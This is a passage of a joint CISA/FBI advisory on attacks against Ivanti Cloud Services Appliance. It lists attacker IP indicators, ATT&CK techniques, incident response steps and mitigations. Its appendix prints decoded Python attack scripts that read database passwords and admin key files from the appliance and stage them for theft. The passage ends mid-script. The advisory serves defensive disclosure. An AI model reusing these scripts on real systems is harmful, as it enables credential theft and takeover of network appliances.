<td>Ipv4</td>
<td>216.131.75[.]53</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>23.236.66[.]97</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>208.105.190[.]170</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>136.144.17[.]145</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>136.144.17[.]133</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>216.73.162[.]56</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>104.28.240[.]123</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>163.5.171[.]49</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>89.187.178[.]179</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>163.5.171[.]49</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>203.160.86[.]69</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>185.220.69[.]83</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>185.199.103[.]196</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>188.172.229[.]15</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>155.138.215[.]144</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>64.176.49[.]160</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>185.40.4[.]38</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>216.131[.]75.53</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>Ipv4</td>
<td>185.40.4[.]95</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<h2><strong>MITRE ATT&amp;CK Tactics and Techniques</strong></h2>
<p>See <strong>Table 4 to&nbsp;Table 13</strong>&nbsp;for all referenced threat actor tactics and techniques in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&amp;CK framework, see CISA and MITRE ATT&amp;CK’s <a href="https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping" title="Best Practices for MITRE ATT&amp;CK Mapping">Best Practices for MITRE ATT&amp;CK Mapping</a> and CISA’s <a href="https://github.com/cisagov/Decider/" title="cisagov / decider">Decider Tool</a>.</p>
<div>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap>
<caption><em>Table&nbsp;4: Reconnaissance</em></caption>
<thead>
<tr>
<th role="columnheader" data-tablesaw-priority="persist">Technique Title</th>
<th role="columnheader">ID</th>
<th role="columnheader">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Active Scanning: Vulnerability Scanning</td>
<td><a href="https://attack.mitre.org/versions/v16/techniques/T1595/002/" title="Active Scanning: Vulnerability Scanning">T1595.002</a></td>
<td>Threat actors performed reconnaissance by using Obelisk and GoGo to scan for vulnerabilities.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap>
<caption><em>Table 5: Initial Access</em></caption>
<thead>
<tr>
<th role="columnheader" data-tablesaw-priority="persist">Technique Title</th>
<th role="columnheader">ID</th>
<th role="columnheader">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Exploit Public-Facing Application</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1190/" title="Exploit Public-Facing Application">T1190</a></td>
<td>Threat actors leveraged weaknesses in applications that are not properly handled to compromise network device protocols, perform SQL injections, and generally exploit applications.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap>
<caption><em>Table&nbsp;6: Execution</em></caption>
<thead>
<tr>
<th role="columnheader" data-tablesaw-priority="persist">Technique Title</th>
<th role="columnheader">ID</th>
<th role="columnheader">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Command and Scripting Interpreter</td>
<td><a href="https://attack.mitre.org/versions/v16/techniques/T1059/" title="Command and Scripting Interpreter">T1059</a></td>
<td>Threat actors abused command and script interpreters to execute commands, scripts, or binaries.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap>
<caption><em>Table 7: Persistence</em></caption>
<thead>
<tr>
<th role="columnheader" data-tablesaw-priority="persist">Technique Title</th>
<th role="columnheader">ID</th>
<th role="columnheader">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Modify Authentication Process</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1556/" title="Modify Authentication Process">T1556</a></td>
<td>Threat actors executed an authentication bypass by exploiting the authentication mechanisms of a device to gain access to organizations’ networks.</td>
</tr>
<tr>
<td>Server Software Component: Web Shell</td>
<td><a href="https://attack.mitre.org/versions/v16/techniques/T1505/003/" title="Server Software Component: Web Shell">T1505.003</a></td>
<td>Threat actors executed code to implant webshells for persistence.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap>
<caption><em>Table 8: Privilege Escalation</em></caption>
<thead>
<tr>
<th role="columnheader" data-tablesaw-priority="persist">Technique Title</th>
<th role="columnheader">ID</th>
<th role="columnheader">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Exploitation for Privilege Escalation</td>
<td><a href="https://attack.mitre.org/versions/v16/techniques/T1068/" title="Exploitation for Privilege Escalation">T1068</a></td>
<td>Threat actors leveraged weaknesses to gain access via an outdated, vulnerable version of a server.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap>
<caption><em>Table 9: Defense Evasion</em></caption>
<thead>
<tr>
<th role="columnheader" data-tablesaw-priority="persist">Technique Title</th>
<th role="columnheader">ID</th>
<th role="columnheader">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Hide Artifacts: Hidden Users</td>
<td><a href="https://attack.mitre.org/versions/v16/techniques/T1564/002/" title="Hide Artifacts: Hidden Users">T1564.002</a></td>
<td>Threat actors acted as a hidden user to disguise their presence on a system.</td>
</tr>
<tr>
<td>Deobfuscate/Decode Files or Information</td>
<td><a href="https://attack.mitre.org/versions/v16/techniques/T1140/" title="Deobfuscate/Decode Files or Information">T1140</a></td>
<td>Threat actors decrypted credentials prior to exfiltration by leveraging native tools located in the extracted backup file.</td>
</tr>
<tr>
<td>Abuse Elevation Control Mechanism: Sudo and Sudo Caching</td>
<td><a href="https://attack.mitre.org/versions/v16/techniques/T1548/003/" title="Abuse Elevation Control Mechanism: Sudo and Sudo Caching">T1548.003</a></td>
<td>Threat actors used <code>sudo</code> commands to disable vulnerabilities, modify and remove webshells, and remove evidence of exploitation.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap>
<caption><em>Table 10: Credential Access</em></caption>
<thead>
<tr>
<th role="columnheader" data-tablesaw-priority="persist">Technique Title</th>
<th role="columnheader">ID</th>
<th role="columnheader">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Unsecured Credentials: Credentials in Files</td>
<td><a href="https://attack.mitre.org/versions/v16/techniques/T1552/001/" title="Unsecured Credentials: Credentials in Files">T1552.001</a></td>
<td>Threat actors harvested encrypted admin credentials to gain further access.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap>
<caption><em>Table 11: Lateral Movement</em></caption>
<thead>
<tr>
<th role="columnheader" data-tablesaw-priority="persist">Technique Title</th>
<th role="columnheader">ID</th>
<th role="columnheader">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Exploitation of Remove Services</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1210/" title="Exploitation of Remove Services">T1210</a></td>
<td>Threat actors exploited CSAs via remote services to gain access to an organization’s networks by leveraging programming errors, EOL systems, and operating systems.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap>
<caption><em>Table 12: Command and Control</em></caption>
<thead>
<tr>
<th role="columnheader" data-tablesaw-priority="persist">Technique Title</th>
<th role="columnheader">ID</th>
<th role="columnheader">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Remote Access Software</td>
<td><a href="https://attack.mitre.org/techniques/T1219/" title="Remote Access Software">T1219</a></td>
<td>Threat actors attempted to remotely authenticate into a victim’s network and execute arbitrary commands on the appliance.</td>
</tr>
<tr>
<td>Application Layer: Web Protocol</td>
<td><a href="https://attack.mitre.org/versions/v16/techniques/T1071/001/" title="Application Layer: Web Protocol">T1071.001</a></td>
<td>Threat actors used tools such as <code>GET</code> or <code>POST</code> requests to acquire session and CSRF tokens.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap>
<caption><em>Table&nbsp;13: Exfiltration</em></caption>
<thead>
<tr>
<th role="columnheader" data-tablesaw-priority="persist">Technique Title</th>
<th role="columnheader">ID</th>
<th role="columnheader">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Exfiltration</td>
<td><a href="https://attack.mitre.org/versions/v16/tactics/TA0010/" title="Exfiltration">TA0010</a></td>
<td>Threat actors exfiltrated encrypted admin credentials or other encrypted data for future use.</td>
</tr>
</tbody>
</table>
<h2><strong>Incident Response</strong></h2>
<p>If compromise is detected, the authoring agencies recommend that organizations:</p>
<ol>
<li>Quarantine or take offline potentially affected hosts.</li>
<li>Reimage compromised hosts.</li>
<li>Provision new account credentials.</li>
<li>For Ivanti hosts with Active Directory (AD) access, threat actors can trivially export active domain administrator credentials during initial compromise. Until there is evidence to the contrary, it is assumed that AD access on compromised systems is connected to external authentication systems such as Lightweight Directory Access Protocol and AD.</li>
<li>Collect and review artifacts such as running processes/services, unusual authentications, and recent network connections.<br><strong>Note:</strong> Removing malicious administrator accounts may not fully mitigate risk considering threat actors may have established additional persistence mechanisms.</li>
<li>Report the compromise to CISA via CISA’s 24/7 Operations Center (<a href="mailto:report@cisa.gov" title="Report to CISA">report@cisa.gov</a> or 888-282-0870).</li>
</ol>
<h2><strong>Mitigations</strong></h2>
<p>CISA and FBI recommend organizations:&nbsp;</p>
<ul>
<li><strong>Upgrade to the latest supported version of Ivanti CSA immediately</strong> for continued support.[<a href="https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-CSA-4-6-Cloud-Services-Appliance-CVE-2024-8963?language=en_US" title="Security Advisory Ivanti CSA 4.6 (Cloud Services Appliance) (CVE-2024-8963)">3</a>] Please note that&nbsp;Ivanti CSA 4.6 is EOL and no longer receives patches or third-party libraries. Customers must upgrade to the latest version of the product for continued support.</li>
<li><strong>Install endpoint detection and response (EDR) on the system to alert network defenders on unusual and potentially malicious activity.</strong></li>
<li><strong>Establish a baseline and maintain detailed logs of network traffic, account behavior, and software.&nbsp;</strong>This can assist network defenders in identifying anomalies that may indicate malicious activity more quickly.</li>
<li><strong>Keep all operating systems, software, and firmware up to date.&nbsp;</strong>Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Organizations should patch vulnerable software and hardware systems within 24 to 48 hours of vulnerability disclosure. Prioritize patching <a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" title="Known Exploited Vulnerabilities Catalog">known exploited vulnerabilities</a> in internet-facing systems [<a href="https://www.cisa.gov/cybersecurity-performance-goals-cpgs#MitigatingKnownVulnerabilities1E" title="Mitigating Known Vulnerabilities (1.E)">CPG 1.E</a>].</li>
<li><strong>Secure remote access tools by:</strong>
<ul>
<li>Implementing application controls to manage and control software execution, including allowlisting remote access programs. Application controls should prevent installation and execution of portable versions of unauthorized remote access and other software. A properly configured application allowlisting solution will block any unlisted application execution. Allowlisting is important because antivirus solutions may fail to detect the execution of malicious portable executables when the files use any combination of compression, encryption, or obfuscation.</li>
</ul>
</li>
<li><strong>Strictly limit the use of remote desktop protocol (RDP) and other remote desktop services.</strong> If RDP is necessary, rigorously apply best practices, for example [<a href="https://www.cisa.gov/cybersecurity-performance-goals-cpgs#NoExploitableServicesontheInternet2W">CPG 2.W</a>]:
<ul>
<li>Audit the network for systems using RDP.</li>
<li>Close unused RDP ports.</li>
<li>Enforce account lockouts after a specified number of attempts.</li>
<li>Apply <a href="https://www.cisa.gov/MFA" title="More than a Password">phishing-resistant multifactor authentication (MFA)</a>.</li>
<li>Log RDP login attempts.</li>
</ul>
</li>
<li>Configure the Windows Registry to require User Account Control (UAC) approval for any PsExec operations requiring administrator privileges to reduce the risk of lateral movement by PsExec.</li>
<li><strong>Follow best cybersecurity practices in your production and enterprise environments,</strong>including mandating&nbsp;<a href="https://www.cisa.gov/MFA" title="More than a Password">phishing-resistant multifactor authentication (MFA)</a> for all staff and services. For additional best practices, see CISA’s&nbsp;<a href="https://www.cisa.gov/cybersecurity-performance-goals" title="Cross-Sector Cybersecurity Performance Goals">Cross-Sector Cybersecurity Performance Goals (CPGs)</a>. The CPGs, developed by CISA and the National Institute of Standards and Technology (NIST), are a prioritized subset of IT and OT security practices that can meaningfully reduce the likelihood and impact of known cyber risks and common tactics, techniques, and procedures. Because the CPGs are a subset of best practices, CISA and FBI also recommend software manufacturers implement a comprehensive information security program based on a recognized framework, such as the&nbsp;<a href="https://www.nist.gov/cyberframework" title="NIST Cybersecurity Framework">NIST Cybersecurity Framework (CSF)</a>.</li>
</ul>
<h2><strong>Validate Security Controls</strong></h2>
<p>In addition to applying mitigations, CISA and FBI recommend exercising, testing, and validating your organization’s security program against the threat behaviors mapped to the MITRE ATT&amp;CK for Enterprise framework in this advisory. CISA and FBI recommend testing your existing security controls inventory to assess how they perform against the ATT&amp;CK techniques described in this advisory.</p>
<p>To get started:</p>
<ol>
<li>Select an ATT&amp;CK technique described in this advisory (see<strong>&nbsp;Table 4</strong> through <strong>Table 13</strong>).</li>
<li>Align your security technologies against the technique.</li>
<li>Test your technologies against the technique.</li>
<li>Analyze your detection and prevention technologies’ performance.</li>
<li>Repeat the process for all security technologies to obtain a set of comprehensive performance data.</li>
<li>Tune your security program, including people, processes, and technologies, based on the data generated by this process.</li>
</ol>
<p>CISA and FBI recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&amp;CK techniques identified in this advisory.</p>
<h2><strong>References</strong></h2>
<ol>
<li><a href="https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-CSA-Cloud-Services-Appliance-CVE-2024-9379-CVE-2024-9380-CVE-2024-9381?language=en_US" title="Security Advisory Ivanti CSA (Cloud Services Application) (CVE-2024-9379, CVE-2024-9380, CVE-2024-9381)">Ivanti: Security Advisory Ivanti CSA (Cloud Services Application) (CVE-2024-9379, CVE-2024-9380, CVE-2024-9381)</a></li>
<li><a href="https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-Cloud-Service-Appliance-CSA-CVE-2024-8190?language=en_US" title="Security Advisory Ivanti Cloud Service Appliance (CSA) (CVE-2024-8190)">Ivanti: Security Advisory Ivanti Cloud Service Appliance (CSA) (CVE-2024-8190)</a></li>
<li><a href="https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-CSA-4-6-Cloud-Services-Appliance-CVE-2024-8963?language=en_US" title="Security Advisory Ivanti CSA 4.6 (Cloud Services Appliance) (CVE-2024-8963)">Ivanti: Security Advisory Ivanti CSA 4.6 (Cloud Services Appliance) (CVE-2024-8963)</a></li>
<li><a href="https://www.fortinet.com/blog/threat-research/burning-zero-days-suspected-nation-state-adversary-targets-ivanti-csa" title="Burning Zero Days: Suspected Nation-State Adversary Targets Ivanti CSA">Fortinet: Burning Zero Days: Suspected Nation-State Adversary Targets Ivanti CSA</a></li>
</ol>
<h2><strong>Contact Information</strong></h2>
<p>Organizations are encouraged to report suspicious or criminal activity related to information in this advisory to:</p>
<ul>
<li>CISA via CISA’s 24/7 Operations Center (<a href="mailto:report@cisa.gov" title="Report to CISA">report@cisa.gov</a> or 888-282-0870) or your local <a href="https://www.fbi.gov/contact-us/field-offices" title="Field Offices">FBI field office</a>. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact.</li>
</ul>
<h2><strong>Disclaimer</strong></h2>
<p>The information in this report is being provided “as is” for informational purposes only. CISA and FBI do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA and FBI.</p>
<h2><strong>Version History</strong></h2>
<p><strong>January 22, 2025:</strong> Initial version.</p>
<h2><strong>Appendix A: Encoded and Decoded Scripts</strong></h2>
<h3>Decoded Python Scripts</h3>
<table>
<tbody>
<tr>
<td>{<br>import os, re, base64, time<br>os.chdir("/tmp")<br>d = "/backups"<br>def set_msg(p, t='', m=''):<br>&nbsp; &nbsp;if t and m:<br>&nbsp; &nbsp; &nbsp; &nbsp;msg = 'AA{}:{}BB'.format(t, base64.b64encode(m.encode()).decode())<br>&nbsp; &nbsp;else:<br>&nbsp; &nbsp; &nbsp; &nbsp;msg = ''<br>&nbsp; &nbsp;os.system('''export PGPASSWORD={};echo "update user_info set organization='{}' where username='admin'"|psql -d brokerdb -U gsbadmin'''.format(p, msg))<br>try:<br>&nbsp; &nbsp;r = max([os.path.join(d, f) for f in os.listdir(d) if os.path.isfile(os.path.join(d, f))], key=os.path.getmtime)<br>except:<br>&nbsp; &nbsp;r = None<br>with open("/opt/landesk/broker/broker.conf") as f:<br>&nbsp; &nbsp;dbpwd = re.findall("PGSQL_PW=(.*)", f.read())[0]<br>if r:<br>&nbsp; &nbsp;p = os.popen("export PGPASSWORD={};echo SELECT passwd FROM user_info WHERE username=\\'admin'\\' | psql -d brokerdb -U gsbadmin -h localhost".format(dbpwd)).read().split("\n")[-4].strip().split(':')<br>&nbsp; &nbsp;os.system("tar zxvf {}".format(r))<br>&nbsp; &nbsp;while True:<br>&nbsp; &nbsp; &nbsp; &nbsp;for f in os.listdir('.'):<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;if re.match("php\w{6}", f):<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;os.chmod(f, 0o777)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;m = os.popen("./{} {} {} {} root/.certs/{}.key {}".format(f, p[4], p[5], p[6], p[1], p[1])).read().strip()<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;if m:<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;set_msg(dbpwd, "PASSWORD", m)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;time.sleep(30)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;set_msg(dbpwd)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;exit()<br>else:<br>&nbsp; &nbsp;set_msg(dbpwd, 'ERROR', 'NO BACKUP')<br>}</td>
</tr>
</tbody>
</table>
<table>
<tbody>
<tr>
<td>{<br>import os, re, base64, time<br>os.chdir("/tmp")<br>d = "/backups"<br>def set_msg(p, t='', m=''):<br>&nbsp; &nbsp;if t and m:<br>&nbsp; &nbsp; &nbsp; &nbsp;msg = 'AA{}:{}BB'.format(t, base64.b64encode(m.encode()).decode())<br>&nbsp; &nbsp;else:<br>&nbsp; &nbsp; &nbsp; &nbsp;msg = ''<br>&nbsp; &nbsp;os.system('''export PGPASSWORD={};echo "update user_info set organization='{}' where username='service'"|psql -d brokerdb -U gsbadmin'''.format(p, msg))<br>try:<br>&nbsp; &nbsp;r = max([os.path.join(d, f) for f in os.listdir(d) if os.path.isfile(os.path.join(d, f))], key=os.path.getmtime)<br>except:<br>&nbsp; &nbsp;r = None<br>with open("/opt/landesk/broker/broker.conf") as f:<br>&nbsp; &nbsp;dbpwd = re.findall("PGSQL_PW=(.*)", f.read())[0]<br>if r:<br>&nbsp; &nbsp;p = os.popen("export PGPASSWORD={};echo SELECT passwd FROM user_info WHERE username=\\'service'\\' | psql -d brokerdb -U gsbadmin -h localhost".format(dbpwd)).read().split("\n")[-4].strip().split(':')<br>&nbsp; &nbsp;os.system("tar zxvf {}".format(r))<br>&nbsp; &nbsp;while True:<br>&nbsp; &nbsp; &nbsp; &nbsp;for f in os.listdir('.'):<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;if re.match("php\w{6}", f):<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;os.chmod(f, 0o777)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;m = os.popen("./{} {} {} {} root/.certs/{}.key {}".format(f, p[4], p[5], p[6], p[1], p[1])).read().strip()<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;if m:<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;set_msg(dbpwd, "PASSWORD", m)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;time.sleep(30)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;set_msg(dbpwd)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;exit()<br>else:<br>&nbsp; &nbsp;set_msg(dbpwd, 'ERROR', 'NO BACKUP')<br>}</td>
</tr>
</tbody>
</table>
<table>
<tbody>
<tr>
<td>import os, re, base64, time<br>os.chdir("/tmp")<br>d = "/backups"<br>def set_msg(p, t='', m=''):<br>&nbsp; &nbsp;if t and m:<br>&nbsp; &nbsp; &nbsp; &nbsp;msg = 'AA{}:{}BB'.format(t, base64.b64encode(m.encode()).decode())<br>&nbsp; &nbsp;else:<br>&nbsp; &nbsp; &nbsp; &nbsp;msg = ''<br>&nbsp; &nbsp;os.system('''export PGPASSWORD={};echo "update user_info set organization='{}' where username='admin'"|psql -d brokerdb -U gsbadmin'''.format(p, msg))<br>try:<br>&nbsp; &nbsp;r = max([os.path.join(d, f) for f in os.listdir(d) if os.path.isfile(os.path.join(d, f))], key=os.path.getmtime)<br>except:<br>&nbsp; &nbsp;r = None<br>with open("/opt/landesk/broker/broker.conf") as f:<br>&nbsp; &nbsp;dbpwd = re.findall("PGSQL_PW=(.*)", f.read())[0]<br>if r:<br>&nbsp; &nbsp;p = os.popen("export PGPASSWORD={};echo SELECT passwd FROM user_info WHERE username=\\'admin\\' | psql -d brokerdb -U gsbadmin -h localhost".format(dbpwd)).read().split("\n")[-4].strip().split(':')<br>&nbsp; &nbsp;os.system("tar zxvf {}".format(r))<br>&nbsp; &nbsp;while True:<br>&nbsp; &nbsp; &nbsp; &nbsp;for f in os.listdir('.'):<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;if re.match("php\w{6}", f):<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;os.chmod(f, 0o777)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;m = os.popen("./{} {} {} {} root/.certs/{}.key {}".format(f, p[4], p[5], p[6], p[1], p[1])).read().strip()<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;if m:<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;set_msg(dbpwd, "PASSWORD", m)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;time.sleep(30)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;set_msg(dbpwd)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;exit()<br>else:<br>&nbsp; &nbsp;set_msg(dbpwd, 'ERROR', 'NO BACKUP')</td>
</tr>
</tbody>
</table>
<table>
<tbody>
<tr>
<td>import os, re, base64, time<br>os.chdir("/tmp")<br>d = "/backups"<br>def set_msg(p, t='', m=''):<br>&nbsp; &nbsp;if t and m:<br>&nbsp; &nbsp; &nbsp; &nbsp;msg = 'AA{}:{}BB'.format(t, base64.b64encode(m.encode()).decode())<br>&nbsp; &nbsp;else:<br>&nbsp; &nbsp; &nbsp; &nbsp;msg = ''<br>&nbsp; &nbsp;os.system('''export PGPASSWORD={};echo "update user_info set organization='{}' where username='admin'"|psql -d brokerdb -U gsbadmin'''.format(p, msg))<br>try:<br>&nbsp; &nbsp;r = max([os.path.join(d, f) for f in os.listdir(d) if os.path.isfile(os.path.join(d, f))], key=os.path.getmtime)<br>except:<br>&nbsp; &nbsp;r = None<br>with open("/opt/landesk/broker/broker.conf") as f:<br>&nbsp; &nbsp;dbpwd = re.findall("PGSQL_PW=(.*)", f.read())[0]<br>if r:<br>&nbsp; &nbsp;p = os.popen("export PGPASSWORD={};echo SELECT passwd FROM user_info WHERE username=\\'admin\\' | psql -d brokerdb -U gsbadmin -h localhost".format(dbpwd)).read().split("\n")[-4].strip().split(':')<br>&nbsp; &nbsp;os.system("tar zxvf {}".format(r))<br>&nbsp; &nbsp;while True:<br>&nbsp; &nbsp; &nbsp; &nbsp;for f in os.listdir('.'):<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;if re.match("php\w{6}", f):<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;os.chmod(f, 0o777)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;m = os.popen("./{} {} {} {} root/.certs/{}.key {}".format(f, p[4], p[5], p[6], p[1], p[1])).read().strip()<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;if m:<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;set_msg(dbpwd, "PASSWORD", m)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;time.sleep(30)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;set_msg(dbpwd)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;exit()<br>else:<br>&nbsp; &nbsp;set_msg(dbpwd, 'ERROR', 'NO BACKUP')</td>
</tr>
</tbody>
</table>
<table>
<tbody>
<tr>
<td>
<p>{<br>import os, re, base64, time<br>os.chdir("/tmp")<br>d = "/backups"<br>def set_msg(p, t='', m=''):<br>&nbsp; &nbsp;if t and m:<br>&nbsp; &nbsp; &nbsp; &nbsp;msg = 'AA{}:{}BB'.format(t, base64.b64encode(m.encode()).decode())<br>&nbsp; &nbsp;else:<br>&nbsp; &nbsp; &nbsp; &nbsp;msg = ''<br>&nbsp; &nbsp;os.system('''export PGPASSWORD={};echo "update user_info set organization='{}',lockoutalert=0,attempts=0 where username='admin'"|psql -d brokerdb -U gsbadmin'''.format(p, msg))</p>
<p>with open("/opt/landesk/broker/broker.conf") as f:<br>&nbsp; &nbsp;dbpwd = re.findall("PGSQL_PW=(.*)", f.read())[0]</p>
<p>&nbsp; &nbsp;p = os.popen("export PGPASSWORD={};echo SELECT passwd FROM user_info WHERE username=\\'admin\\' | psql -d brokerdb -U gsbadmin -h localhost".format(dbpwd)).read().split("\n")[-4].strip()<br>&nbsp; &nbsp;v = p.split(':')<br>&nbsp; &nbsp;k = os.popen('base 64 -w0 root/.certs/{}.key'.format(v[1])).read()<br>&nbsp; &nbsp;set_msg(dbpwd, "PASSWORD", p+'||'+k)<br>&nbsp; &nbsp;time.sleep(30)<br>&nbsp; &nbsp;set_msg(dbpwd)<br>}</p>
</td>
</tr>
</tbody>
</table>
<table>
<tbody>
<tr>
<td>
<p>{<br>import os, re, base64, time</p>
<p>def set_msg(p, t='', m=''):<br>&nbsp; &nbsp;if t and m:<br>&nbsp; &nbsp; &nbsp; &nbsp;msg = 'AA{}:{}BB'.format(t, base64.b64encode(m.encode()).decode())<br>&nbsp; &nbsp;else:<br>&nbsp; &nbsp; &nbsp; &nbsp;msg = ''<br>&nbsp; &nbsp;os.system('''export PGPASSWORD={};echo "update user_info set organization='{}',lockoutalert=0 where username='admin'"|psql -d brokerdb -U gsbadmin'''.format(p, msg))</p>
